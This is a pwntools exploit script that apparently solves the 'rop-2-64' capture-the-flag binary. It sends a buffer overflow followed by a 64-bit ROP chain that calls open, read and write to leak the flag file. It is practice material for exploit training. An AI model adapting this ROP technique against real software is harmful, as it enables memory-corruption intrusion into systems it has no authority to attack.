from pwn import *

GARB = 'bbbbbbbb'

# This code requires a symbolic link from open to flag to work

# Addresses needed for the attack
pop_rdi_ret_addr = 0x400743 # From ROPgadget --binary ./rop-2-64
pop_rdx_ret_addr = 0x400668 # From ROPgadget --binary ./rop-2-64
pop_rsi_pop_r15_ret_addr = 0x400741 # From ROPgadget --binary ./rop-2-64
open_addr = ELF('./rop-2-64').symbols['open']
read_addr = ELF('./rop-2-64').symbols['read']
write_addr = ELF('./rop-2-64').symbols['write']
open_string_addr = 0x400395 # address of 'open' in the program code

ans_addr = 0x000000601040

# Launch processs and send rop chain
p = process('./rop-2-64')
inp = 'a' * 0x80 + GARB + p64(pop_rdi_ret_addr) + p64(open_string_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(0) + GARB + p64(open_addr)
inp = inp + p64(pop_rdi_ret_addr) + p64(3) + p64(pop_rsi_pop_r15_ret_addr) + p64(ans_addr) + GARB + p64(pop_rdx_ret_addr) + p64(100) + p64(read_addr)
inp = inp + p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_pop_r15_ret_addr) + p64(ans_addr) + GARB + p64(pop_rdx_ret_addr) + p64(100) + p64(write_addr)
p.sendline(inp)

# See the flag
p.interactive()

